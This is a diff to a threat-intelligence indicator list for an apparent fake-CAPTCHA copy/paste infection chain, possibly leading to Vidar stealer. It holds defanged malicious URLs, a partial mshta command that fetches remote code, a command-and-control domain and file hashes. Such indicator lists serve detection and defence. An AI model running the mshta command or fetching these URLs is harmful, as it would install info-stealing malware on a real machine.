@@ -14,7 +14,7 @@ mshta hxxps[:]//check.djtvx[.]online/gkcxv.google?u=2e631b21-27da-4534-82b2-bc42
 
 TRAFFIC GENERATED AFTGER RUNNING THE COPY/PASTED SCRIPT:
 
-- hxxps[:]//check.djtvx[.]online/gkcxv.google?u=2e631b21-27da-4534-82b2-bc424dd0abc7
+- hxxps[:]//check.djtvx[.]online/gkcxv.google?u=2e631b21-27da-4534-82b2-bc424dd0abc7 --> 302 redirect
 - hxxps[:]//u1.galvanizegestationludicrous[.]shop/sh.mp4
 - hxxps[:]//bitlunch.smogturfprance[.]shop/e7f2-4033-awjxs.captcha
 - hxxps[:]//www.mediafire[.]com/file_premium/pzse74za05xo46l/nrjjpi.mp4/file
@@ -22,3 +22,23 @@ TRAFFIC GENERATED AFTGER RUNNING THE COPY/PASTED SCRIPT:
 HTTPS POST-INFECTION TRAFFIC (POSSIBLE VIDAR):
 
 - [Cloudflare IP address]:443 - eteherealpath[.]top - HTTPS, TLSv1.3 traffic
+
+ASSOCIATED FILES:
+
+- SHA256 hash: 1c8860b24267cf5ed4bb21db453bc3288c4e9339eeb5d85500847fe2e4dffd73
+- File size: 1,436,680 bytes
+- File type: data
+- File location: hxxps[:]//u1.galvanizegestationludicrous[.]shop/sh.mp4
+- File description: File run by mshta.exe for this infection chain that generates PowerShell command
+
+- SHA256 hash: aeb961f463c0c6a71ca565eedd5586689bbfc4c701d51bb283b6637455df118a
+- File size: 4,268,345 bytes
+- File type: ASCII text, with very long lines, with CRLF line terminators
+- File location: hxxps[:]//bitlunch.smogturfprance[.]shop/e7f2-4033-awjxs.captcha
+- File description: File retrieved by PowerShell command 
+
+- SHA256 hash: cd002e23393562cdca1c768938a5b83a21c81759a90616821001815a55dc90c0
+- File size: 1,196,032 bytes
+- File type: data
+- File location: hxxps[:]//www.mediafire[.]com/file_premium/pzse74za05xo46l/nrjjpi.mp4/file
+- File description: Encoded/encrypted binary for possibly Vidar
